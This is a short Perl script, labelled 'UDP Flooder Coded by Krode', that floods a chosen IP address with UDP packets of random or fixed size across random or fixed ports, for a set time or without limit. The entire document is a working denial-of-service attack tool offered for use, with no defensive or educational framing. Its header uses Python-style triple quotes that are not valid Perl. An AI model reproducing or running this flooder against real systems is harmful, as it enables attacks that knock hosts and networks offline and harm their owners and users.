'''
UDP Flooder Coded by Krode
'''


use Socket;
use strict;
 
if ($#ARGV != 3) {
  print "udpflood.pl <IP> <Port> <Packets> <Time>\n\n";
  print " Port = 0: Use random Ports\n";
  print " Packets = 0: Use random n of Packets\n";
  print " Time = 0: Unlimited Attack\n";
  exit(1);
}
 
my ($ip,$port,$size,$time) = @ARGV;
 
my ($iaddr,$endtime,$psize,$pport);
 
$iaddr = inet_aton("$ip") or die "Invalid IP Adress: $ip\n";
$endtime = time() + ($time ? $time : 1000000);
 
socket(flood, PF_INET, SOCK_DGRAM, 17);
 
 
print "Attacking $ip " . ($port ? $port : "random") . " com " .
  ($size ? "$size-bytes" : "random size") . " Packets" .
  ($time ? " for $time seconds" : "") . "\n";
print "Stop the attack by pressing Ctrl + C\n" unless $time;
 
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1024-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;
 
  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}